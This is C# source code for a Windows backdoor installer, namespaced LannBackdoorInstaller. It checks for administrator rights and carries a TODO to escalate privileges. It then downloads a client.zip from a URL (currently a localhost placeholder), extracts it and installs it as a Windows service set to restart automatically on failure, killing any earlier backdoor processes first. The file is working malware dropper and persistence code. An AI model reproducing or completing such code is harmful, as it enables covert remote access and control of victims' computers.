using System.Diagnostics;
using System.IO.Compression;
using System.Security.Principal;
using System.Text;
using LannLogger;
using Serilog.Core;
using Utilities;
using Constants = LannConstants.Constants;

namespace LannBackdoorInstaller;

#pragma warning disable CA1416

public static class LBLoader {
    private static Logger Logger = LoggerFactory.CreateLogger("LannBackdoorInstaller");
    private static readonly bool IsAdministrator = new WindowsPrincipal(WindowsIdentity.GetCurrent())
        .IsInRole(WindowsBuiltInRole.Administrator);

    private static string URL;
    
    public static async Task Main(string[] args) {
        Console.OutputEncoding = Encoding.UTF8;
        if (Constants.Debug) Logger.Debug("Running {Mode} mode", "DEBUG");

        Logger.Warning("TODO: {0}", "Escalate Privileges");
        Logger.Information("Running as {Role}",
            IsAdministrator ? "Administrator" : "User");
        if (!IsAdministrator) return;

        Logger.Information("Retrieving URL...");
        URL = await RetrieveUrl();
        
        Logger.Information("Target URL: {URL}", URL);

        Logger.Information("Installing...");
        await Install();
            
        Logger.Information("Installation success, service started.");
    }

    private static async Task<string> RetrieveUrl() {
        Logger.Warning("TODO: {0}", "Retrieve URL");
        return "http://localhost:2022";
    }

    private static async Task Uninstall() {
        if (ServiceManager.IsInstalled(Constants.ServiceName)) {
            Logger.Information("Stopping service...");
            await ServiceManager.Stop(Constants.ServiceName);

            Logger.Information("Uninstalling service...");
            await ServiceManager.Uninstall(Constants.ServiceName);
        }

        Logger.Information("Killing backdoor processes");
        Process[] processes = Process.GetProcessesByName(Constants.BackdoorFileName)
            .Concat(Process.GetProcessesByName(Constants.ServiceFileName))
            .ToArray();
        foreach (Process process in processes) {
            process.Kill();
            Logger.Information("Killed: {Name}", process.ProcessName);
        }
    }

    private static async Task Install() {
        await Uninstall();

        Logger.Information("Fetching Client...");
        using HttpClient client = new();
        using HttpResponseMessage message = await client.GetAsync(URL + "/client.zip");
        await using Stream stream = await message.Content.ReadAsStreamAsync();
        ZipArchive archive = new(stream);

        string path = Constants.InstallPath;
        Logger.Information("Extracting archive into: {Path}", path);

        if (File.Exists(path)) {
            Logger.Information("Path already exists, deleting...");
            FileSystem.RecursiveDelete(path);
        }

        Directory.CreateDirectory(path);
        Logger.Information("Created directory: {Path}", path);

        try {
            archive.ExtractToDirectory(path);
        } catch (Exception error) {
            Logger.Error("Failed to extract: {Error}", error);
            return;
        }

        Logger.Information("Installing service...");

        ServiceManager.Install(
            Constants.ServiceName,
            Constants.ServiceDisplayName,
            path + "/" + Constants.ServiceFileName
        );

        ServiceManager.SetFailureActions(
            Constants.ServiceName,
            new FailureAction(RecoverActionType.Restart, 5000),
            new FailureAction(RecoverActionType.Restart, 5000),
            new FailureAction(RecoverActionType.Restart, 5000),
            300
        );

        Logger.Information("Starting service...");
        await ServiceManager.Start(Constants.ServiceName);
    }
}

#pragma warning restore CA1416